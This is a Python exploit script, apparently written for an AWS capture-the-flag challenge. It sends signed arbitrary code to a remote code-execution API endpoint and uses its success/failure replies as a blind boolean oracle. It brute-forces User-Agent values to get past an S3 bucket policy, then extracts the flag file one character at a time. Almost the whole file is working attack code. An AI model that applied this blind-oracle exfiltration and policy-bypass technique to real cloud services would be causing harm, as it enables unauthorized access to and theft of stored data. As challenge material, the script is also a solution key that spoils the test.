import json
import base64
import os
import urllib.request
import urllib.error
import time
import sys
from pathlib import Path

try:
    import boto3
    from botocore.auth import SigV4Auth
    from botocore.awsrequest import AWSRequest
    from botocore.credentials import Credentials
except ImportError:
    print("ERROR: botocore and boto3 are required. Please run: pip install boto3 botocore", file=sys.stderr)
    sys.exit(1)

def load_creds():
    creds_file = Path(__file__).parent / "creds.txt"
    if creds_file.exists():
        lines = [line.strip() for line in creds_file.read_text(encoding="utf-8").splitlines() if line.strip()]
        creds_map = {}
        for line in lines:
            if ":" in line:
                k, v = line.split(":", 1)
                creds_map[k.strip().lower()] = v.strip()
        ak = creds_map.get("access key id", os.environ.get("AWS_ACCESS_KEY_ID", ""))
        sk = creds_map.get("secret key", os.environ.get("AWS_SECRET_ACCESS_KEY", ""))
        tk = creds_map.get("session token", os.environ.get("AWS_SESSION_TOKEN", ""))
        return ak, sk, tk
    return (
        os.environ.get("AWS_ACCESS_KEY_ID", ""),
        os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        os.environ.get("AWS_SESSION_TOKEN", "")
    )

AK, SK, TK = load_creds()
if not AK or not SK:
    print("ERROR: AWS credentials not found in creds.txt or environment.", file=sys.stderr)
    sys.exit(1)

creds = Credentials(AK, SK, TK)

API = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"
USER = "userd8a2f72fe43094e8"
FLAG_KEY = "flag.txt"
PATH_URL = f"https://s3.us-east-1.amazonaws.com/{USER}/{FLAG_KEY}"
VIRT_URL = f"https://{USER}.s3.us-east-1.amazonaws.com/{FLAG_KEY}"
OK = '{"result":"Code executed successfully"}'
FAIL = '{"error":"Something went wrong!"}'

results = {"taxonomy": {}, "unsigned_hits": [], "flag": None, "notes": []}

def verify_identity():
    print("=== VERIFYING PARTICIPANT STS IDENTITY ===", flush=True)
    sts = boto3.client("sts", aws_access_key_id=AK, aws_secret_access_key=SK, aws_session_token=TK, region_name="us-east-1")
    ident = sts.get_caller_identity()
    arn = ident.get("Arn", "")
    print(f"Caller ARN: {arn}", flush=True)
    if "ctf_participant_role" not in arn:
        print("WARNING: Identity is not ctf_participant_role. Stage 2 code_exec may fail.", flush=True)
    return ident

def exec_code(code, timeout=30):
    b64 = base64.b64encode(code.encode("utf-8")).decode("ascii")
    payload = json.dumps({"code": b64})
    r0 = AWSRequest(
        method="POST",
        url=API,
        data=payload,
        headers={"Content-Type": "application/json"},
    )
    SigV4Auth(creds, "execute-api", "us-east-1").add_auth(r0)
    req = urllib.request.Request(
        API, data=payload.encode("utf-8"), headers=dict(r0.headers), method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8").strip()
    except Exception as e:
        return e.read().decode("utf-8").strip() if hasattr(e, "read") else str(e)

def maj(code, tries=5):
    votes = []
    for _ in range(tries):
        b = exec_code(code)
        if b == OK:
            votes.append(True)
        elif b == FAIL:
            votes.append(False)
        else:
            print("  [junk response]", b[:100].replace("\n", " "), flush=True)
            time.sleep(0.25)
            continue
        if len(votes) >= 3 and len(set(votes[-3:])) == 1:
            return votes[-1]
    return max(set(votes), key=votes.count) if votes else None

def report(name, val):
    results["taxonomy"][name] = val
    print(f"{name}: {val}", flush=True)

def main():
    verify_identity()

    print("\n=== SMOKE TESTING ORACLE ===", flush=True)
    report("smoke_pass", maj("pass"))
    report("smoke_fail", maj("assert False"))
    if results["taxonomy"]["smoke_pass"] is not True or results["taxonomy"]["smoke_fail"] is not False:
        print("WARN: boolean oracle noisy or unreachable", flush=True)
        results["notes"].append("smoke test failed or noisy oracle")
        return results

    print("\n=== PROBING USER-AGENT CANDIDATES (PATH-STYLE UNSIGNED) ===", flush=True)
    uas = [
        "Amazon CloudFront",
        "CloudFront",
        "AmazonS3",
        "aws-internal/3",
        "aws-internal/1",
        "aws-internal/2",
        "junior_developer",
        "Miss Me Yet?",
        "Miss Me Yet",
        "???",
        "Test Site",
        "System Documentation",
        "This is me",
        "pretty sure I deleted it all",
        "I had a lot of fun doing it!",
        "I made sure not to include any secret information here—pretty sure I deleted it all.",
        "REDACTED",
        "bucket_policy.json",
        "really fixed bugs this time",
        "fixed bugs",
        "super secret project",
        "I am a junior developer",
        "Code executed successfully",
        "Something went wrong!",
        "Squished bug remains",
        "* SPLAT! *",
        "johndoe@atotallyrealcompany.com",
        "John Doe",
        "corgi",
        "Have Some Faith",
        "codebuild_vpc",
        "atotallyrealcompany.com",
        "Uh them pesky bugs, you can never avoid them can you?",
        "added github connector and role for cicd",
        "d4ysu55xg7wfi.cloudfront.net",
        "d4ysu55xg7wfi",
        "junior_developer.png",
        "index.html",
        "docs.html",
        "flag.txt",
        "Statement1",
        "Statement2",
        "S3Console/1",
        "AWS-CloudFront/1.0",
        "squished_bug_exfil",
        "Amazon CloudFront (http://aws.amazon.com/cloudfront)",
        "Amazon CloudFront - Amazon Simple Storage Service",
        "",
    ]

    hit_ua = None
    for idx, ua in enumerate(uas, 1):
        code = f"""
import urllib.request, urllib.error
req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':{ua!r}}})
try:
    with urllib.request.urlopen(req,timeout=3) as r:
        body=r.read()
        assert r.status==200 and len(body)>0
except Exception:
    assert False
"""
        ok = maj(code, tries=3)
        print(f"  [{idx:02d}/{len(uas):02d}] UA {ua!r} -> {ok}", flush=True)
        if ok is True:
            hit_ua = ua
            results["unsigned_hits"].append(ua)
            break

    report("unsigned_any_hit", hit_ua is not None)

    if hit_ua is not None:
        print(f"\n*** HIT FOUND! UA={hit_ua!r} ***", flush=True)
        results["notes"].append(f"path-style UNSIGNED hit with UA={hit_ua!r}")

        print("\n=== RECOVERING FLAG BODY ===", flush=True)
        flen = None
        for n in range(0, 65):
            if maj(
                f"""
import urllib.request
req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':{hit_ua!r}}})
body=urllib.request.urlopen(req,timeout=5).read()
assert len(body)=={n}
""",
                tries=3,
            ):
                flen = n
                break
        print(f"Flag length: {flen}", flush=True)
        if flen is not None and flen > 0:
            out = []
            alphabet = (
                "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "{}_-.=+/!?@#$%&*():;[]<>~, \n\r\t"
            )
            for i in range(flen):
                ch = None
                for c in alphabet:
                    if maj(
                        f"""
import urllib.request
req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':{hit_ua!r}}})
body=urllib.request.urlopen(req,timeout=5).read()
assert body[{i}:{i+1}]=={c.encode()!r}
""",
                        tries=3,
                    ):
                        ch = c
                        break
                if ch is None:
                    for b in range(256):
                        if maj(
                            f"""
import urllib.request
req=urllib.request.Request({PATH_URL!r},headers={{'User-Agent':{hit_ua!r}}})
body=urllib.request.urlopen(req,timeout=5).read()
assert body[{i}]=={b}
""",
                            tries=2,
                        ):
                            ch = chr(b) if 32 <= b < 127 else f"\\x{b:02x}"
                            break
                out.append(ch if ch is not None else "?")
                print(f"  char[{i}] = {out[-1]!r}", flush=True)
            flag = "".join(out)
            results["flag"] = flag
            print(f"\n=========================================", flush=True)
            print(f"RECOVERED STAGE 2 FLAG: {flag}", flush=True)
            print(f"=========================================\n", flush=True)
            Path(__file__).parent.joinpath("STAGE2_FLAG.txt").write_text(flag + "\n", encoding="utf-8")
        else:
            results["notes"].append("Hit found but length oracle failed")
    else:
        results["notes"].append("No UA hit in candidate dictionary; residual is Statement2 User-Agent")

    out_file = Path(__file__).parent / "stage2_probe_results.json"
    out_file.write_text(json.dumps(results, indent=2), encoding="utf-8")
    print(f"\nResults written to {out_file}", flush=True)
    return results

if __name__ == "__main__":
    main()
